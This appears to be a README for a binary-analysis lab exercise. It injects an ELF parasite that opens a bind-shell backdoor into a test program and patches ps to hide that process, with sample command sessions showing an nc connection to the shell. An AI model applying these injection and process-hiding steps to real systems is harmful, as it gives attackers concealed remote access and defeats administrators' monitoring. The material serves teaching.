# An ELF Parasite

Write your own ELF parasite and use elfinject to inject it into a program
of your choice. See whether you can make the parasite fork off a child
process that opens a backdoor. Bonus points if you can create a modiﬁed
copy of ps that doesn’t show the parasite process in the process listing.

## Solution

victim.c (acts as the host binary)\
elf-parasite.s (acts as a bind shell)

## Bonus Solution

ps-parasite.s (acts as the process hider)

## Sample Session

Victim machine:

```
$ gcc -o victim victim.c
$ nasm -f bin -o elf-parasite.bin elf-parasite.s
$ ./elfinject victim elf-parasite.bin ".parasite" 0x800000 0
$ ./victim
I'm a victim!
$ netstat -ap tcp | grep victim
tcp        0      0 *:19484    *:*    LISTEN    10662/victim 
```

Attacker machine:

```
$ nc -nv 10.0.0.33 19484
found 0 associations
found 1 connections:
     1: flags=82<CONNECTED,PREFERRED>
        outif en0
        src 10.0.0.37 port 61034
        dst 10.0.0.33 port 19484
        rank info not available
        TCP aux info available

Connection to 10.0.0.33 port 19484 [tcp/*] succeeded!
whoami
admin
exit
```

## Sample Session (Bonus)

```
$ nasm -f bin -o ps-parasite.bin ps-parasite.s
$ python3 ps-patch.py # this patches calls to readproc/readproctab2
[*] Copying /bin/ps to [...]/ps-modified
[*] Applying readproc patch at offset 0x2cf9
[*] Applying readproctab2 patch at offset 0x2909
[*] Done applying patches
$ ./elfinject ps-modified ps-parasite.bin ".parasite" 0x800000 -1
$ ./victim
I'm a victim!
$ netstat -ap tcp | grep victim
tcp        0      0 *:19484    *:*    LISTEN    10662/victim 
$ # The victim process is hidden in all of the following ps outputs:
$ ./ps-modified
[...]
$ ./ps-modified aux
[...]
$ ./ps-modified -e
[...]
$ ./ps-modified -ef
[...]
$ ./ps-modified f (invokes readproctab2)
[...]
